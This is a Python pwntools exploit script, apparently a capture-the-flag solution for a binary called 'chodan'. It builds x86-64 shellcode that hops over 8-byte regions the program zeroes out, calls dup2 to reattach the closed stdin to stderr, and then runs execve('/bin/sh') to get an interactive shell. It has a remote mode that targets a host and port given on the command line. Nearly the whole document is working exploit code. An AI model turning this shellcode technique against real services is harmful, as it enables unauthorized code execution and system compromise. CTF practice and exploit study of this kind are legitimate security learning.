#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chodan')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+226
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
every next 8 bytes are zero'ed out

we can write shellcode that after it executes some instruction it skips to the next 8 byte

the program closes stdin but we can reopen it using dup2 syscall as stdout/stderr isn't closed

dup2(2, 0) -> this now points stdin to stderr

then we can do a second staged shellcode this prevents us from doing tedious work with the bypass??
"""


def init():
    global io

    io = start()


def set_reg(reg, val):
    pad = asm("nop") * 8
    jmp_pad = asm("nop") * 3
    jmp_8 = b"\xeb\x08"

    sc = asm(f"xor {reg}, {reg}")
    sc += jmp_pad
    sc += jmp_8
    sc += pad
    sc += asm(f"push {val}")
    sc += asm(f"pop {reg}")
    sc += jmp_pad
    sc += jmp_8
    sc += pad

    return sc

def syscall():
    pad = asm("nop") * 8
    jmp_ad = asm("nop") * 4
    jmp_8 = b"\xeb\x08"

    sc = asm("syscall")
    sc += jmp_ad
    sc += jmp_8
    sc += pad

    return sc

def add_rdi():
    pad = asm("nop") * 8
    jmp_ad = asm("nop") * 2
    jmp_8 = b"\xeb\x08"

    sc = asm("add rdi, 0x28")
    sc += jmp_ad
    sc += jmp_8
    sc += pad

    return sc


def set_rdi_ptr():
    pad = asm("nop") * 8
    jmp_8 = b"\xeb\x08"

    sc = asm("lea r8, [rsp + 0x10]")
    sc += asm("nop")
    sc += jmp_8
    sc += pad
    sc += asm("mov rdi, qword ptr [r8]")
    sc += asm("nop") * 3
    sc += jmp_8
    sc += pad
    
    return sc


def null_rsi_rdx():
    pad = asm("nop") * 8
    jmp_8 = b"\xeb\x08"

    sc = asm("xor rsi, rsi")
    sc += asm("xor rdx, rdx")
    sc += jmp_8
    sc += pad

    return sc


def solve():


    # set up register for dup2 syscall
    shellcode = set_reg('rax', 0x21)
    shellcode += set_reg('rdi', 0x2)
    shellcode += set_reg('rsi', 0x0)
    shellcode += syscall()

    # set up register for execve syscall
    shellcode += set_reg('rax', 0x3b)
    shellcode += null_rsi_rdx()
    shellcode += set_rdi_ptr()
    shellcode += syscall()
    shellcode += cyclic(40) + b"/bin/sh\x00"

    print(disasm(shellcode))

    io.sendafter(b":", shellcode)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

